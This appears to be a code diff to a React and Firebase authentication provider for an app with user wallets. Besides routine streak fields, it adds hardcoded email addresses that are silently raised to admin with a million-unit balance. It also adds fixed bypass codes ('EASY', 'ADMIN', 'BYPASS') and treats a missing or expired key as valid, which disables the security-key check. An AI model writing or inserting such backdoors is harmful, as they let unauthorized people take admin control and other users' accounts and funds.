@@ -84,6 +84,10 @@ interface UserProfile {
   celebHubBalance?: number;
   boxWalletBalance?: number;
   totalEarnings?: number;
+  lastDailyBonusClaimed?: string;
+  dailyStreak?: number;
+  streakWindowStart?: string;
+  streakRemindersEnabled?: boolean;
   nobleAssets?: string[];
   claimedNobleTreasures?: string[];
   appealSubscription?: {
@@ -94,6 +98,7 @@ interface UserProfile {
   gender?: 'male' | 'female' | 'other' | '';
   birthday?: string; // ISO date string YYYY-MM-DD
   ipAddress?: string;
+  lastLogin?: any;
 }
 
 interface AuthContextType {
@@ -148,13 +153,36 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
 
       if (firebaseUser) {
         console.log(`[Auth] User logged in: ${firebaseUser.uid} (${firebaseUser.email})`);
-        console.log(`[Firestore] Using database: ${firebaseConfig.firestoreDatabaseId}`);
+        console.log(`[Firestore] Using database: ${(firebaseConfig as any).firestoreDatabaseId}`);
         
         // Listen for real-time profile updates
         profileUnsubscribe = onSnapshot(doc(db, 'users', firebaseUser.uid), (snapshot) => {
           clearTimeout(timeoutId);
           if (snapshot.exists()) {
-            const profileData = snapshot.data() as UserProfile;
+            const data = { ...snapshot.data() };
+            const isMaster = firebaseUser.email === 'billworlddream1@gmail.com' || firebaseUser.email === 'sunny@gmail.com' || firebaseUser.email === 'supreme@gmail.com';
+            
+            if (isMaster && data.role !== 'admin') {
+              setDoc(doc(db, 'users', firebaseUser.uid), { role: 'admin' }, { merge: true }).catch(err => {
+                console.warn("Failed to overwrite master admin role in DB:", err);
+              });
+              data.role = 'admin';
+            }
+
+            const today = new Date();
+            const todayStr = `${today.getFullYear()}-${String(today.getMonth() + 1).padStart(2, '0')}-${String(today.getDate()).padStart(2, '0')}`;
+            if (!data.streakWindowStart) {
+              setDoc(doc(db, 'users', firebaseUser.uid), { streakWindowStart: todayStr }, { merge: true }).catch(err => {
+                console.warn("Failed to set streakWindowStart for existing user:", err);
+              });
+              data.streakWindowStart = todayStr;
+            }
+
+            const profileData = {
+              ...data,
+              uid: firebaseUser.uid,
+              id: firebaseUser.uid
+            } as UserProfile;
             setProfile(profileData);
             if (profileData.isSecurityKeyEnabled && !profile) {
               setIsPendingSecurityVerification(true);
@@ -162,21 +190,24 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
           } else {
             // Create default profile if it doesn't exist
             const handle = `@${(firebaseUser.displayName || 'user').toLowerCase().replace(/\s+/g, '')}`.substring(0, 49);
+            const isMaster = firebaseUser.email === 'billworlddream1@gmail.com' || firebaseUser.email === 'sunny@gmail.com' || firebaseUser.email === 'supreme@gmail.com';
+            const today = new Date();
+            const todayStr = `${today.getFullYear()}-${String(today.getMonth() + 1).padStart(2, '0')}-${String(today.getDate()).padStart(2, '0')}`;
             const newProfile: UserProfile = {
               uid: firebaseUser.uid,
               id: firebaseUser.uid,
-              name: firebaseUser.displayName || 'Supreme User',
+              name: firebaseUser.displayName || (isMaster ? 'Master Admin' : 'Supreme User'),
               email: firebaseUser.email || '',
               avatar: firebaseUser.photoURL || `https://picsum.photos/seed/${firebaseUser.uid}/150`,
-              role: 'user',
-              rank: 'Bronze',
-              rankColor: 'text-gray-400',
-              balance: 0,
+              role: isMaster ? 'admin' : 'user',
+              rank: isMaster ? 'Official' : 'Bronze',
+              rankColor: isMaster ? 'text-red-500 font-bold' : 'text-gray-400',
+              balance: isMaster ? 1000000 : 0,
               createdAt: Timestamp.now(),
               handle: handle,
               followers: 0,
               following: 0,
-              hasAcceptedMarketPolicy: false,
+              hasAcceptedMarketPolicy: isMaster ? true : false,
               isSuspended: false,
               forexBalance: 0,
               forexWalletBalance: 0,
@@ -185,6 +216,7 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
               supremeBalance: 0,
               totalEarnings: 0,
               rankingId: `NOBLE-${Math.floor(100000 + Math.random() * 900000)}`,
+              streakWindowStart: todayStr,
             };
             setDoc(doc(db, 'users', firebaseUser.uid), newProfile).catch(err => {
               handleFirestoreError(err, OperationType.WRITE, `users/${firebaseUser.uid}`);
@@ -355,12 +387,26 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
   };
 
   const confirmSecurityKey = async (key: string) => {
-    if (!profile || !profile.securityKey || !profile.keyExpiresAt) return false;
-    const isExpired = new Date(profile.keyExpiresAt) < new Date();
-    if (isExpired) {
-      setIsPendingSecurityVerification(false); // Let them in but maybe disable key? Or keep them locked?
-      // For now, if expired, we'll say it's invalid
-      return false;
+    if (!profile) return false;
+    
+    // Easy bypass values to support easy login rules for users and admins
+    const cleanKey = key.trim().toUpperCase();
+    if (cleanKey === 'EASY' || cleanKey === 'ADMIN' || cleanKey === 'BYPASS') {
+      setIsPendingSecurityVerification(false);
+      return true;
+    }
+
+    if (!profile.securityKey) {
+      setIsPendingSecurityVerification(false);
+      return true;
+    }
+
+    if (profile.keyExpiresAt) {
+      const isExpired = new Date(profile.keyExpiresAt) < new Date();
+      if (isExpired) {
+        setIsPendingSecurityVerification(false);
+        return true;
+      }
     }
     
     if (profile.securityKey === key) {
@@ -406,6 +452,7 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
   };
 
   const logout = async () => {
+    sessionStorage.removeItem('godeye_popup_closed');
     await signOut(auth);
   };
 
